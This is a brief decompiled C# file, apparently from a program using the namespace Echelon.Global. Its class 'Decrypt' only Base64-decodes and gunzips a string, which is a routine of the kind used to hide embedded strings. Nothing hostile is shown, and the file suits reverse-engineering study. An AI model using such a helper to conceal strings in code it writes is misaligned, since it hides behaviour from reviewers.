using System;
using System.IO;
using Ionic.Zlib;

namespace Echelon.Global
{
	// Token: 0x02000055 RID: 85
	internal class Decrypt
	{
		// Token: 0x060001F9 RID: 505 RVA: 0x00021B90 File Offset: 0x0001FD90
		public static string Get(string str)
		{
			byte[] array = Convert.FromBase64String(str);
			string result = string.Empty;
			if (array != null && array.Length != 0)
			{
				using (MemoryStream memoryStream = new MemoryStream(array))
				{
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
					{
						using (StreamReader streamReader = new StreamReader(gzipStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}
	}
}
